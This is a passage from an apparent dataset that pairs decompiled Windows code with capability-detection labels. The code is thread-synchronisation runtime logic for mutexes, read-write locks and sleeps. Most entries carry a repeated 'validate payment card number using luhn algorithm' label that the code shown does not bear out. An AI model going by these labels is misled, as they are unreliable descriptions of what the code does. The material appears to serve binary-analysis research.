= &uStack144 + iVar7;\n    *(&uStack144 + iVar7) = 0x656d68732d636367;\n    *(&uStack136 + iVar7) = 0x64742d6d;\n    *(&uStack136 + iVar7 + 4) = 0x326d;\n    uVar12 = iVar4 + 0x50;\n    *(&uStack136 + iVar7 + 6) = 0x2d;\n    *(auStack184 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack136 + iVar7 + 7, \"mutex_global_shmem\", iVar4);\n    puVar1 = &uStack128 + iVar4 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack144 + uVar12 + iVar7) = 0;\n    *(&uStack144 + (iVar4 + 0xf) + iVar7) = 0;\n    *(auStack184 + iVar7) = 0x410ace;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack144 + (iVar4 + 0xf) + iVar7) = 0x2d;\n    *(auStack184 + iVar7) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar8, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar9 = (*pcVar2)();\n        return uVar9;\n    }\n    *(auStack184 + iVar7) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack184 + iVar7) = 0x410b07;\n        uVar10 = sub.msvcrt.dll_malloc(0x10);\n        uVar9 = 0x40;\n        do {\n            if ((uVar10 >> (uVar9 & 0x3f) & 1) != 0) {\n                *(iVar6 + (uVar12 - uVar9)) = 0x41;\n            }\n            uVar11 = uVar9 - 1;\n            uVar9 = uVar11;\n        } while (uVar11 != 0);\n        *(auStack184 + iVar7) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar9 = (*pcVar2)();\n            return uVar9;\n        }\n        *(auStack184 + iVar7) = 0x410b49;\n        uVar9 = fcn.00410980(uVar3, iVar6, uVar12, iVar4 + 0x10);\n        if (uVar9 == uVar10) {\n            *(auStack184 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar10, 0, 0x10);\n            *(auStack184 + iVar7) = 0x410bb1;\n            (*0x40fb30)(uVar10);\n        }\n        else {\n            *(auStack184 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar10);\n        }\n    }\n    else {\n        *(auStack184 + iVar7) = 0x410b94;\n        uVar9 = fcn.00410980(uVar3, iVar6, uVar12, iVar4 + 0x10);\n    }\n    *(auStack184 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar8);\n    *(auStack184 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n    return uVar9;\n}\n",
        "token_count": 1558
    },
    "00410a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "contain loop",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\nuint64_t fcn.00410a00(ulong arg1, ulong arg2, code *arg3)\n\n{\n    uchar *arg2_00;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    ulong auStack112 [5];\n    ulong uStack72;\n    \n    auStack112[0] = 0x410a26;\n    uVar7 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack112[0] = 0x410a3e;\n    iVar6 = fcn.0040b810(uVar7);\n    iVar6 = -iVar6;\n    arg2_00 = &stack0xffffffffffffffb8 + iVar6;\n    *(&stack0xffffffffffffffb8 + iVar6) = 0x656d68732d636367;\n    *(&stack0xffffffffffffffc0 + iVar6) = 0x64742d6d;\n    *(&stack0xffffffffffffffc4 + iVar6) = 0x326d;\n    uVar11 = iVar4 + 0x50;\n    (&stack0xffffffffffffffc6)[iVar6] = 0x2d;\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffffc7 + iVar6, arg1, iVar4);\n    puVar1 = &stack0xffffffffffffffc8 + iVar4 + iVar6;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffffb8)[uVar11 + iVar6] = 0;\n    (&stack0xffffffffffffffb8)[(iVar4 + 0xf) + iVar6] = 0;\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410ace;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffffb8)[(iVar4 + 0xf) + iVar6] = 0x2d;\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff90 + iVar6) = 0x410b07;\n        uVar9 = sub.msvcrt.dll_malloc(arg2);\n        uVar8 = 0x40;\n        do {\n            if ((uVar9 >> (uVar8 & 0x3f) & 1) != 0) {\n                arg2_00[uVar11 - uVar8] = 0x41;\n            }\n            uVar10 = uVar8 - 1;\n            uVar8 = uVar10;\n        } while (uVar10 != 0);\n        *(&stack0xffffffffffffff90 + iVar6) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(&stack0xffffffffffffff90 + iVar6) = 0x410b49;\n        uVar8 = fcn.00410980(uVar3, arg2_00, uVar11, iVar4 + 0x10);\n        if (uVar8 == uVar9) {\n            *(&stack0xffffffffffffff90 + iVar6) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar9, 0, arg2);\n            if (arg3 != NULL) {\n                *(&stack0xffffffffffffff90 + iVar6) = 0x410bb1;\n                (*arg3)(uVar9);\n            }\n        }\n        else {\n            *(&stack0xffffffffffffff90 + iVar6) = 0x410b59;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff90 + iVar6) = 0x410b94;\n        uVar8 = fcn.00410980(uVar3, arg2_00, uVar11, iVar4 + 0x10);\n    }\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(&stack0xffffffffffffff90 + iVar6) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar8;\n}\n",
        "token_count": 1293
    },
    "0040d0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040d0f0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 != 0) {\n        if (*0x4349b8 == 0) {\n            *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n        }\n        fcn.00410710(*0x4349b8);\n        uVar1 = fcn.0040b9e0(arg1);\n        if (*0x4349b8 == 0) {\n            *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n        }\n        fcn.00410100(*0x4349b8);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "0040e680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040e680(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0040cd40();\n    if (iVar1 != 0) {\n        return *(iVar1 + 0x1d8);\n    }\n    return 0;\n}\n",
        "token_count": 63
    },
    "0040e6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040e6b0(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.0040d0f0(arg1);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(iVar1 + 0x30);\n    }\n    return uVar2;\n}\n",
        "token_count": 93
    },
    "0040e710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0040e710(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0040cd40();\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = iVar1 + 0x18;\n    }\n    return iVar1;\n}\n",
        "token_count": 76
    },
    "0040e9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040e9b0(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0040cd40();\n    if (iVar1 != 0) {\n        if (arg1 < 1) {\n            LOCK();\n            *(iVar1 + 0x20) = *(iVar1 + 0x20) + -1;\n            return;\n        }\n        LOCK();\n        *(iVar1 + 0x20) = *(iVar1 + 0x20) + 1;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0040ec10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040ec10(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0040cd40();\n    if (arg1 != 0) {\n        fcn.0040eac0();\n        if (*(iVar1 + 0x30) == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(arg1);\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(iVar1 + 0x30), arg1);\n        }\n        fcn.0040eac0();\n        return 0;\n    }\n    fcn.0040eac0();\n    (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    fcn.0040eac0();\n    return 0;\n}\n",
        "token_count": 177
    },
    "004107d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.004107d0(int32_t **arg1)\n\n{\n    uchar *arg2;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong uVar9;\n    uint64_t uVar10;\n    char *arg1_00;\n    uint32_t uVar11;\n    bool bVar12;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t uStack128;\n    \n    uVar8 = fcn.00410410(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    uVar4 = fcn.0040fe40(*arg1);\n    uStack136 = *arg1;\n    uStack128 = uVar4;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar7 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar12 = *0x434a38 == 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar12) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return uStack128;\n        }\n        fcn.00410d10(iVar7);\n        return uStack128;\n    }\n    iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar7 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar5 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    arg2 = &stack0xffffffffffffff70 + iVar7;\n    *(&stack0xffffffffffffff70 + iVar7) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar7) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar7) = 0x326d;\n    uVar4 = iVar5 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar7, \"mutex_global_shmem\", iVar5);\n    puVar1 = &stack0xffffffffffffff80 + iVar5 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar4 + iVar7] = 0;\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ace;\n    uVar9 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar5 + 0xf) + iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar9, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b07;\n        uVar10 = sub.msvcrt.dll_malloc(0x10);\n        uVar8 = 0x40;\n        do {\n            if ((uVar10 >> (uVar8 & 0x3f) & 1) != 0) {\n                arg2[uVar4 - uVar8] = 0x41;\n            }\n            uVar11 = uVar8 - 1;\n            uVar8 = uVar11;\n        } while (uVar11 != 0);\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b49;\n        uVar8 = fcn.00410980(uVar3, arg2, uVar4, iVar5 + 0x10);\n        if (uVar8 == uVar10) {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar10, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410bb1;\n            (*0x40fb30)(uVar10);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar10);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b94;\n        uVar8 = fcn.00410980(uVar3, arg2, uVar4, iVar5 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar9);\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar9);\n    return uVar8;\n}\n",
        "token_count": 1654
    },
    "00410810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00410810(ulong param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *apuStack32 [2];\n    \n    iVar2 = fcn.0040fd00(param_1, apuStack32);\n    puVar1 = apuStack32[0];\n    if ((iVar2 == 0) && (apuStack32[0] != NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(apuStack32[0] + 6));\n        *puVar1 = 0xdeadbeef;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        sub.msvcrt.dll_free(apuStack32[0]);\n    }\n    return iVar2;\n}\n",
        "token_count": 177
    },
    "00410c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.00410c70(int32_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    ulong uVar5;\n    \n    uVar5 = 0x16;\n    if ((arg1 != NULL) && (uVar5 = 0x10,  0 < arg1[3])) {\n        piVar1 = arg1 + 3;\n        LOCK();\n        piVar2 = arg1 + 3;\n        *piVar2 = *piVar2 + -1;\n        pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n        iVar3 = *piVar2;\n        while (iVar3 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            (*pcVar4)(0);\n            LOCK();\n            *piVar1 = *piVar1 + -1;\n            iVar3 = *piVar1;\n        }\n        if (*arg1 == arg1[1]) {\n            *arg1 = *arg1 + 1;\n            LOCK();\n            arg1[3] = arg1[3] + 1;\n            uVar5 = 0;\n        }\n        else {\n            LOCK();\n            arg1[3] = arg1[3] + 1;\n            uVar5 = 0x10;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 317
    },
    "00410db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.00410db0(uint32_t *arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    ulong uVar6;\n    \n    uVar6 = 0x16;\n    if (arg1 != NULL) {\n        puVar1 = arg1 + 3;\n        LOCK();\n        puVar2 = arg1 + 3;\n        *puVar2 = *puVar2 - 1;\n        pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n        uVar4 = *puVar2;\n        while (uVar4 != 0) {\n            LOCK();\n            *puVar1 = *puVar1 + 1;\n            (*pcVar5)(0);\n            LOCK();\n            *puVar1 = *puVar1 - 1;\n            uVar4 = *puVar1;\n        }\n        uVar4 = *arg1;\n        *arg1 = *arg1 + 1;\n        LOCK();\n        arg1[3] = arg1[3] + 1;\n        pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n        uVar3 = arg1[1];\n        while (uVar3 < uVar4) {\n            (*pcVar5)(0);\n            uVar3 = arg1[1];\n        }\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 327
    },
    "00411360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00411360(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    ulong uVar2;\n    \n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    fcn.00410db0(*0x434a58);\n    uVar2 = 0x16;\n    if (((arg1 != NULL) && (piVar1 = *arg1,  piVar1 != NULL)) && (*piVar1 == -0x454e0f13)) {\n        if (piVar1 == 0xffffffffffffffff) {\n            uVar2 = 1;\n        }\n        else {\n            piVar1[1] = piVar1[1] + 1;\n            uVar2 = 0;\n        }\n    }\n    if (*0x434a58 != 0) {\n        fcn.00410d10(*0x434a58);\n        return uVar2;\n    }\n    *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    fcn.00410d10(*0x434a58);\n    return uVar2;\n}\n",
        "token_count": 293
    },
    "00411430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00411430(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    *arg2 = NULL;\n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    iVar2 = fcn.00410c70(*0x434a58);\n    if (iVar2 != 0) {\n        return 0x10;\n    }\n    if ((arg1 == NULL) || (piVar1 = *arg1,  piVar1 == NULL)) {\n        uVar3 = 0x16;\n    }\n    else if (piVar1 == 0xffffffffffffffff) {\n        *arg1 = NULL;\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x16;\n        if ((*piVar1 == -0x454e0f13) && (uVar3 = 0x10,  piVar1[1] == 0)) {\n            *arg2 = piVar1;\n            uVar3 = 0;\n            *arg1 = NULL;\n        }\n    }\n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    fcn.00410d10(*0x434a58);\n    return uVar3;\n}\n",
        "token_count": 357
    },
    "00411560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00411560(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00410710(arg1 + 0x18);\n    if (iVar1 == 0) {\n        iVar2 = fcn.00410710(arg1 + 0x20);\n        if (iVar2 != 0) {\n            fcn.00410100(arg1 + 0x18);\n            return iVar2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "004115c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.004115c0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    uVar1 = fcn.00410100(arg1 + 0x20);\n    uVar2 = fcn.00410100(arg1 + 0x18);\n    if ((uVar2 != 0) && (arg2 != 0)) {\n        return uVar2;\n    }\n    uVar2 = uVar2 & 0xffffffff;\n    if ((arg2 | uVar1) != 0) {\n        uVar2 = uVar1;\n    }\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "00411620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00411620(int32_t **arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char *arg1_00;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t uStack128;\n    \n    uStack128 = arg2;\n    if (*0x434a58 == 0) {\n        *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n    }\n    fcn.00410db0(*0x434a58);\n    if ((**arg1 == -0x454e0f13) && (0 < (*arg1)[1])) {\n        (*arg1)[1] = (*arg1)[1] + -1;\n        if (*0x434a58 == 0) {\n            *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n            fcn.00410d10(*0x434a58);\n            return uStack128;\n        }\n        fcn.00410d10(*0x434a58);\n        return uStack128;\n    }\n    iVar10 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf\n              (iVar10 + 0x60, \"Assertion failed: (%s), file %s, line %d\\n\", \n               \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"rwl_global_shmem\";\n    auStack184[0] = 0x410a26;\n    uStack136 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar6 = fcn.0040b810(arg1_00);\n    iVar6 = -iVar6;\n    iVar10 = &uStack144 + iVar6;\n    *(&uStack144 + iVar6) = 0x656d68732d636367;\n    *(&uStack136 + iVar6) = 0x64742d6d;\n    *(&uStack136 + iVar6 + 4) = 0x326d;\n    uVar12 = iVar4 + 0x50;\n    *(&uStack136 + iVar6 + 6) = 0x2d;\n    *(auStack184 + iVar6) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack136 + iVar6 + 7, \"rwl_global_shmem\", iVar4);\n    puVar1 = &uStack128 + iVar4 + iVar6;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack144 + uVar12 + iVar6) = 0;\n    *(&uStack144 + (iVar4 + 0xf) + iVar6) = 0;\n    *(auStack184 + iVar6) = 0x410ace;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack144 + (iVar4 + 0xf) + iVar6) = 0x2d;\n    *(auStack184 + iVar6) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(auStack184 + iVar6) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack184 + iVar6) = 0x410b07;\n        uVar9 = sub.msvcrt.dll_malloc(0x10);\n        uVar8 